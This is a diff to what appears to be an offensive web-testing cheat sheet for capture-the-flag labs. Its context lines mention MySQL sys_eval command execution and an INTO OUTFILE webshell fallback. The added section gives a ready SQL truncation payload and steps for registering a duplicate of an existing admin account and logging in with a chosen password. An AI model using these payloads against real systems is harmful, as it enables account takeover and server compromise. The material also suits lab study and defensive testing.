@@ -56,3 +56,14 @@ MySQL `sys_eval()` OS command execution via UNION (requires `sys` UDF or MariaDB
 ```
 If `sys_eval` is unavailable, try `sys_exec` (no output) or fall back to `INTO OUTFILE` webshell.
 
+
+## SQL Truncation Auth Bypass
+
+When a registration form checks uniqueness with a full SELECT but truncates on INSERT — register as an existing account by padding with spaces:
+
+```
+# Field max length = 20; existing account = "admin@site.htb" (14 chars)
+email:    "admin@site.htb      x"   (14 + 6 spaces + 1 = 21 chars)
+password: anything
+```
+First SELECT finds no match (string too long). INSERT truncates to 20 chars, strips trailing space → `admin@site.htb` — duplicate row with your password. Login with `admin@site.htb` + your chosen password.
